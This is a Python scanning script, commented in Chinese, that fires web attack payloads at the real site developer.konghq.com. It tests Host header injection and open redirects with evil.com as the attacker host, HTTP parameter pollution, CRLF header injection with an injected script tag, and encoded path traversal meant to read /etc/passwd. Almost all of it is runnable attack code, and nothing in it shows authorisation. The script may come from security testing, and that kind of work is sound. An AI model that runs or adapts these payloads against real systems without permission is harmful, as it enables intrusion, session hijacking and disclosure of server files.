#!/usr/bin/env python3
"""
KongHQ 其他不常见漏洞测试
1. Host Header Injection（主机头注入）
2. HTTP Parameter Pollution（参数污染）
3. Open Redirect via URL parsing（URL解析重定向）
4. CRLF Injection（头部注入）
5. Path Traversal via encoding（编码路径遍历）
"""
import requests
from urllib.parse import urljoin, urlencode

BASE_URL = 'https://developer.konghq.com'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}

def test_host_header_injection():
    """测试Host Header Injection"""
    
    print("="*80)
    print("测试1: Host Header Injection")
    print("="*80)
    
    malicious_hosts = [
        'evil.com',
        'developer.konghq.com.evil.com',
        'evil.com/\\@developer.konghq.com',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for host in malicious_hosts:
        print(f"\n[测试] Host: {host}")
        
        headers = {'Host': host}
        
        try:
            resp = session.get(BASE_URL, headers=headers, timeout=10, allow_redirects=False)
            
            # 检查响应中是否使用了恶意Host
            location = resp.headers.get('Location', '')
            content_base = resp.text[:500].lower()
            
            indicators = []
            
            if host in location.lower():
                indicators.append(f"Location头包含恶意Host: {location}")
            
            if f'http://{host}' in content_base or f'https://{host}' in content_base:
                indicators.append("响应体中包含恶意Host")
            
            # 检查Set-Cookie的Domain
            set_cookie = resp.headers.get('Set-Cookie', '')
            if host in set_cookie.lower():
                indicators.append(f"Cookie Domain设置为恶意Host")
            
            if indicators:
                print(f"  🔴 可疑发现:")
                for ind in indicators:
                    print(f"    • {ind}")
            else:
                print(f"  ✅ 正常（未使用恶意Host）")
                
        except Exception as e:
            print(f"  ❌ 错误: {e}")

def test_http_parameter_pollution():
    """测试HTTP参数污染"""
    
    print("\n" + "="*80)
    print("测试2: HTTP Parameter Pollution")
    print("="*80)
    
    # 测试多个同名参数
    test_cases = [
        ('?id=1&id=2&id=3', '多个id参数'),
        ('?filter=a&filter=b', '多个filter参数'),
        ('?redirect=/&redirect=http://evil.com', '多个redirect参数'),
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for params, desc in test_cases:
        print(f"\n[测试] {desc}: {params}")
        
        try:
            url = BASE_URL + '/plugins/' + params
            resp = session.get(url, timeout=10, allow_redirects=False)
            
            print(f"  状态码: {resp.status_code}")
            
            # 检查是否有异常行为
            if resp.status_code in [301, 302]:
                location = resp.headers.get('Location', '')
                print(f"  重定向到: {location}")
                
                if 'evil.com' in location:
                    print(f"  🔴 重定向到恶意URL！")
            
            # 检查响应内容
            if 'id=1' in resp.text and 'id=2' in resp.text:
                print(f"  ⚠️  响应中包含多个参数值（可能被全部处理）")
            
        except Exception as e:
            print(f"  ❌ 错误: {e}")

def test_open_redirect():
    """测试开放重定向"""
    
    print("\n" + "="*80)
    print("测试3: Open Redirect")
    print("="*80)
    
    # 常见的重定向参数
    redirect_params = [
        'redirect', 'next', 'url', 'return', 'returnTo',
        'goto', 'dest', 'destination', 'target'
    ]
    
    malicious_urls = [
        '//evil.com',
        'http://evil.com',
        'https://evil.com',
        '/\\evil.com',
        '///evil.com',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    found_redirects = []
    
    for param in redirect_params:
        for mal_url in malicious_urls[:2]:  # 只测试前2个
            payload = f"?{param}={mal_url}"
            
            try:
                url = BASE_URL + payload
                resp = session.get(url, timeout=10, allow_redirects=False)
                
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get('Location', '')
                    
                    if 'evil.com' in location.lower():
                        print(f"\n🔴 发现开放重定向！")
                        print(f"  参数: {param}")
                        print(f"  Payload: {mal_url}")
                        print(f"  Location: {location}")
                        found_redirects.append((param, mal_url, location))
                    
            except:
                pass
    
    if not found_redirects:
        print("\n✅ 未发现开放重定向")
    
    return found_redirects

def test_crlf_injection():
    """测试CRLF注入"""
    
    print("\n" + "="*80)
    print("测试4: CRLF Injection")
    print("="*80)
    
    # CRLF payload
    crlf_payloads = [
        '%0d%0aSet-Cookie:%20injected=true',
        '%0d%0aX-Injected:%20true',
        '%0d%0a%0d%0a<script>alert(1)</script>',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for payload in crlf_payloads:
        print(f"\n[测试] CRLF: {payload[:50]}...")
        
        try:
            # 尝试在URL中注入
            url = BASE_URL + '/test?' + payload
            
            resp = session.get(url, timeout=10)
            
            # 检查是否注入了头部
            if 'injected=true' in resp.headers.get('Set-Cookie', ''):
                print(f"  🔴 Set-Cookie注入成功！")
            
            if 'X-Injected' in resp.headers:
                print(f"  🔴 自定义头部注入成功！")
            
            # 检查响应
            if resp.status_code == 400:
                print(f"  ✅ 返回400（被拦截）")
            
        except Exception as e:
            print(f"  ❌ 错误: {e}")

def test_path_traversal_encoding():
    """测试编码路径遍历"""
    
    print("\n" + "="*80)
    print("测试5: 编码路径遍历")
    print("="*80)
    
    # 各种编码的路径遍历
    traversal_payloads = [
        '/%2e%2e/%2e%2e/etc/passwd',  # URL编码
        '/%252e%252e/%252e%252e/etc/passwd',  # 双重URL编码
        '/..%252f..%252fetc/passwd',  # 混合编码
        '/.%2e/.%2e/etc/passwd',  # 部分编码
        '/%2e./%2e./etc/passwd',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for payload in traversal_payloads:
        print(f"\n[测试] {payload}")
        
        try:
            url = BASE_URL + payload
            resp = session.get(url, timeout=10)
            
            # 检查是否访问到了敏感文件
            if 'root:' in resp.text or 'bin/bash' in resp.text:
                print(f"  🔴 成功读取/etc/passwd！")
                print(f"  响应前200字符: {resp.text[:200]}")
            elif resp.status_code == 404:
                print(f"  ✅ 返回404（被拦截）")
            elif resp.status_code == 400:
                print(f"  ✅ 返回400（被拦截）")
            else:
                print(f"  ⚠️  状态码: {resp.status_code}")
                
        except Exception as e:
            print(f"  ❌ 错误: {e}")

if __name__ == '__main__':
    print("="*80)
    print(" KongHQ 其他不常见漏洞测试")
    print("="*80)
    
    # 执行所有测试
    test_host_header_injection()
    test_http_parameter_pollution()
    redirects = test_open_redirect()
    test_crlf_injection()
    test_path_traversal_encoding()
    
    print("\n" + "="*80)
    print(" 测试完成")
    print("="*80)
    
    if redirects:
        print(f"\n🔴 发现 {len(redirects)} 个开放重定向！")
    else:
        print("\n✅ 未发现明显的漏洞")
